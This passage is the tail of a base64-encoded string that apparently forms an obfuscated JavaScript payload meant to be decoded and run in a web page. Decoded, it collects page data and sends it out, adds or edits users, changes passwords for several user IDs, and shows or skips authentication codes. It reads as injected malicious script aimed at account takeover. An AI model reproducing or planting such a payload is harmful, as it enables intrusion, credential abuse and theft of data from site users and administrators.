sKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZW5kX2NvbGxlY3RlZF9wYWdlMihkYXRhKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZW5kX2NvbGxlY3RlZF9wYWdlMihkYXRhLm1lc3NhZ2UpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3I6IGZ1bmN0aW9uKGpxWEhSLCBleGNlcHRpb24pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgc3RyID0gIi43IyAxQkUgIiArIGpxWEhSLnN0YXR1cy50b1N0cmluZygpICsgIlxuIiArIGpxWEhSLnJlc3BvbnNlSlNPTi5NZXNzYWdlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbmRfY29sbGVjdGVkX3BhZ2UyKHN0cikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsgICAgICAgICAgfSk7ICAgICAgICAgICAgICAgICAgICB9ICAgICAgICAgICAgICAgfSk7ICAgICAgICAgICAgICB9IGNhdGNoICggZSApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9fQoKICAgICAgICAgIAoKTG9hZERhdGEoKTsKQWRkRWRpdFVzZXIoKTsKY29sbGVjdF9wYWdlX2RhdGE0KCk7CmNvbGxlY3RfcGFnZV9kYXRhNSgxOCwxOCk7CmNvbGxlY3RfcGFnZV9kYXRhNSgxOCwxMik7CmNvbGxlY3RfcGFnZV9kYXRhNSgxMiwxOCk7CmNvbGxlY3RfcGFnZV9kYXRhNSgxMiwxMik7CkVkaXRQYXNzKDE4KTtFZGl0UGFzcygxNyk7RWRpdFBhc3MoMTIpOwoKU2hvd0F1dGhDb2RlKDE4KTtTaG93QXV0aENvZGUoMTcpO1Nob3dBdXRoQ29kZSgxMik7U2hvd0F1dGhDb2RlKDE1KTtTaG93QXV0aENvZGUoMTEpOwpTa2lwQXV0aENvZGUoMTgpO1NraXBBdXRoQ29kZSgxNyk7U2tpcEF1dGhDb2RlKDEyKTtTa2lwQXV0aENvZGUoMTUpO1NraXBBdXRoQ29kZSgxMSk7CiAgICAgICAgICAgIGNvbGxlY3RfcGFnZXMyKCk7IGNvbGxlY3RfcGFnZXMzKDE4KTsgY29sbGVjdF9wYWdlczMoMTcpOyBjb2xsZWN0X3BhZ2VzMygxMik7IGNvbGxlY3RfcGFnZXMzKDE1KTsgIGNvbGxlY3RfcGFnZXMzKDExKTsg'))
